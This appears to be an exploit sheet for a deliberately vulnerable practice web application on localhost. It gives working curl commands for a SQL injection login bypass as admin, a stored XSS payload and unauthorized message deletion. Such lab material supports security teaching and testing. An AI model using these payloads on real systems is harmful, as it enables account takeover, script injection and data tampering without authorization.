A collection of curl commands you can use to exploit the vulnerabilities in the application.

## Injection

```bash
# Log in as any user
curl -X POST "http://localhost:8080/api/login" \
  -H "Content-Type: application/json" \
  -d "{\"username\": \"admin\", \"password\": \"' OR username='admin\"}" \
  -v && echo ""
```

## Cross-Site Scripting (XSS)

```bash
# Execute a script when the guestbook page is loaded
# Make sure to log in and replace "<token>" with your own token first
curl -X POST "http://localhost:8080/api/messages" \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d "{\"message\": \"<img onLoad=(alert('pwned')) src=\\\"./favicon.ico\\\" />\"}" \
  -v && echo ""
```

## Broken Access Control

```bash
# Delete any message without admin privileges
# Make sure to log in and replace "<token>" with your own token first
# Also replace <messageId> with the id of the message you want to delete
curl -X DELETE "http://localhost:8080/api/messages/<messageId>" \
  -H "Authorization: Bearer <token>" \
  -v && echo ""
```
